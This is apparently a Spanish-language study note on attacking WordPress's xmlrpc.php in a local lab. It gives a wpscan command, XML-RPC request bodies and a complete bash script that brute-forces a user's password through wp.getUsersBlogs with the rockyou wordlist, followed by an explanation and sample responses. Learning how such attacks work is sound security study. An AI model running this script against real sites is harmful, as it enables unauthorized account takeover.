----
- Tags: #wordpress #web
-----
El archivo xmlrpc.php es un archivo en WordPress que permite la comunicación y la interacción remota con el sitio mediante el protocolo XML-RPC. Proporciona una interfaz para realizar diversas operaciones, pero también puede ser un objetivo para posibles ataques de seguridad.
Algunos de los ataques más comunes asociados con xmlrpc.php incluyen:

1. Ataques de fuerza bruta: Los atacantes pueden utilizar el archivo xmlrpc.php para realizar ataques de fuerza bruta en los nombres de usuario y contraseñas de los usuarios de WordPress. Intentan adivinar credenciales válidas enviando múltiples solicitudes de inicio de sesión a través de XML-RPC. No se aplican las mismas restricciones de límite de intentos, por esta razón, xmlrpc.php ha sido utilizado en el pasado como una forma de evadir los mecanismos de seguridad que protegen el panel de login estándar.
    
2. Amplificación de ataque DDoS: Los atacantes pueden utilizar xmlrpc.php para llevar a cabo ataques de denegación de servicio distribuido (DDoS). Envían solicitudes masivas y maliciosas a xmlrpc.php, haciendo que el servidor procese una carga excesiva de solicitudes y agote los recursos.
    
3. Exfiltración de datos: Algunos ataques aprovechan xmlrpc.php para intentar extraer información sensible del sitio web, como publicaciones, comentarios o detalles de usuarios, a través de solicitudes XML-RPC maliciosas.
    
4. Inyección de contenido no deseado: Los atacantes pueden intentar utilizar xmlrpc.php para insertar contenido no deseado, como publicaciones o comentarios no deseados, en el sitio de WordPress.

### Ataque fuerza bruta xmlrpc con WPSCAN
```bash
wpscan --url http://localhost:31337 -U jesus -P /opt/rockyou.txt
```


### Ataque de fuerza bruta 

1. Creamos un archivo .xml con el siguiente contenido:
```xml
<?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>
```
Este archivo servirá para ver la respuesta del servidor y listar los métodos disponibles.

2. Tramitar la petición enviando este archivo al servidor 
```bash
curl -s -X POST "https://miwifi.com/xmlrpc.php" -d@file.xml
```

- "-d@": indica el archivo que quieres adjuntar

3. Respuesta del servidor
```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><string>system.multicall</string></value>
  <value><string>system.listMethods</string></value>
  <value><string>system.getCapabilities</string></value>
  <value><string>demo.addTwoNumbers</string></value>
  <value><string>demo.sayHello</string></value>
  <value><string>pingback.extensions.getPingbacks</string></value>
  <value><string>pingback.ping</string></value>
  <value><string>mt.publishPost</string></value>
  <value><string>mt.getTrackbackPings</string></value>
  <value><string>mt.supportedTextFilters</string></value>
  <value><string>mt.supportedMethods</string></value>
  <value><string>mt.setPostCategories</string></value>
  <value><string>mt.getPostCategories</string></value>
  <value><string>mt.getRecentPostTitles</string></value>
  <value><string>mt.getCategoryList</string></value>
  <value><string>metaWeblog.getUsersBlogs</string></value>
  <value><string>metaWeblog.deletePost</string></value>
  <value><string>metaWeblog.newMediaObject</string></value>
  <value><string>metaWeblog.getCategories</string></value>
  <value><string>metaWeblog.getRecentPosts</string></value>
  <value><string>metaWeblog.getPost</string></value>
  <value><string>metaWeblog.editPost</string></value>
  <value><string>metaWeblog.newPost</string></value>
  <value><string>blogger.deletePost</string></value>
  <value><string>blogger.editPost</string></value>
  <value><string>blogger.newPost</string></value>
  <value><string>blogger.getRecentPosts</string></value>
  <value><string>blogger.getPost</string></value>
  <value><string>blogger.getUserInfo</string></value>
  <value><string>blogger.getUsersBlogs</string></value>
  <value><string>wp.restoreRevision</string></value>
  <value><string>wp.getRevisions</string></value>
  <value><string>wp.getPostTypes</string></value>
  <value><string>wp.getPostType</string></value>
  <value><string>wp.getPostFormats</string></value>
  <value><string>wp.getMediaLibrary</string></value>
  <value><string>wp.getMediaItem</string></value>
  <value><string>wp.getCommentStatusList</string></value>
  <value><string>wp.newComment</string></value>
  <value><string>wp.editComment</string></value>
  <value><string>wp.deleteComment</string></value>
  <value><string>wp.getComments</string></value>
  <value><string>wp.getComment</string></value>
  <value><string>wp.setOptions</string></value>
  <value><string>wp.getOptions</string></value>
  <value><string>wp.getPageTemplates</string></value>
  <value><string>wp.getPageStatusList</string></value>
  <value><string>wp.getPostStatusList</string></value>
  <value><string>wp.getCommentCount</string></value>
  <value><string>wp.deleteFile</string></value>
  <value><string>wp.uploadFile</string></value>
  <value><string>wp.suggestCategories</string></value>
  <value><string>wp.deleteCategory</string></value>
  <value><string>wp.newCategory</string></value>
  <value><string>wp.getTags</string></value>
  <value><string>wp.getCategories</string></value>
  <value><string>wp.getAuthors</string></value>
  <value><string>wp.getPageList</string></value>
  <value><string>wp.editPage</string></value>
  <value><string>wp.deletePage</string></value>
  <value><string>wp.newPage</string></value>
  <value><string>wp.getPages</string></value>
  <value><string>wp.getPage</string></value>
  <value><string>wp.editProfile</string></value>
  <value><string>wp.getProfile</string></value>
  <value><string>wp.getUsers</string></value>
  <value><string>wp.getUser</string></value>
  <value><string>wp.getTaxonomies</string></value>
  <value><string>wp.getTaxonomy</string></value>
  <value><string>wp.getTerms</string></value>
  <value><string>wp.getTerm</string></value>
  <value><string>wp.deleteTerm</string></value>
  <value><string>wp.editTerm</string></value>
  <value><string>wp.newTerm</string></value>
  <value><string>wp.getPosts</string></value>
  <value><string>wp.getPost</string></value>
  <value><string>wp.deletePost</string></value>
  <value><string>wp.editPost</string></value>
  <value><string>wp.newPost</string></value>
  <value><string>wp.getUsersBlogs</string></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
```

Pues bien a nosotros solo nos interesa el metodo `<value><string>wp.getUsersBlogs</string></value>` para realizar el ataque de fuerza bruta.
4. Estructura xml para probar contraseñas de usuarios
```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>admin</value></param> 
<param><value>admin123</value></param> 
</params> 
</methodCall>
```

5. Script para el ataque de fuerza bruta
```bash
#!/bin/bash

function ctrl_c(){
        echo -e "\n\n [+]Saliendo...\n\n"
        exit 1
}

trap ctrl_c SIGINT

function crearxml(){
        password=$1
        xmltype="""
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>jesus</value></param>
<param><value>$password</value></param>
</params>
</methodCall>
"""

echo $xmltype > file.xml
echo "Probando con la contraseña $password"

response=$(curl -s -X POST "http://localhost:31337/xmlrpc.php" -d@file.xml)

if [ ! "$(echo $response | grep "Incorrect username or password")"  ];then
        echo "The password is $password"
        exit 0
fi


}

cat /opt/rockyou.txt | while read password; do
        crearxml $password
done
```

### Funcionamiento
1. El script en cuestión utiliza un bucle `while read` para leer cada línea del archivo `rockyou.txt`. Cada línea leída se almacena en la variable `password`, que es utilizada posteriormente en la función `crearxml`.
    
2. Dentro de la función `crearxml`, se asigna el valor del primer argumento (la variable `password` externa) a una variable local también llamada `password`.
    
3. Luego, se crea una cadena XML en la variable `xmltype`, que contiene una solicitud de ataque de fuerza bruta específica para WordPress. El nombre de usuario está fijo como "jesus", y el campo de contraseña utiliza la variable local `password`.
    
4. El contenido de `xmltype` se redirige al archivo `file.xml` utilizando el operador `>`.
    
5. Se imprime por pantalla un mensaje indicando la contraseña que se está probando.
    
6. Se realiza una solicitud POST utilizando la herramienta `curl`, enviando el contenido de `file.xml` como datos. La respuesta del servidor se almacena en la variable `response`.
    
7. Luego, se realiza una verificación utilizando un condicional `if`. En este caso, se niega la condición `(echo $response | grep "Incorrect username or password")`, lo que significa que si la cadena "Incorrect username or password" NO está presente en la respuesta, se ejecutará el bloque de código dentro del condicional.
    
8. Dentro del bloque del condicional, se imprime por pantalla la contraseña correcta y se finaliza la ejecución del script con un código de estado exitoso.

¿Porque negar la condición del if?
Cuando la contraseña es incorrecta nos mostrará un output tal que así:
 ```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value><int>403</int></value>
        </member>
        <member>
          <name>faultString</name>
          <value><string>Incorrect username or password.</string></value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>
```

Como vemos nos muestra el mensaje de usuario o contraseña incorrecto, pues bien cuando la contraseña correspondiente al usuario es la correcta nos muestra otro output distinto:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><struct>
  <member><name>isAdmin</name><value><boolean>1</boolean></value></member>
  <member><name>url</name><value><string>http://localhost:31337/</string></value></member>
  <member><name>blogid</name><value><string>1</string></value></member>
  <member><name>blogName</name><value><string>JesusitoDeMiVida</string></value></member>
  <member><name>xmlrpc</name><value><string>http://localhost:31337/xmlrpc.php</string></value></member>
</struct></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
```

Es por esto que se niega la condición del if.


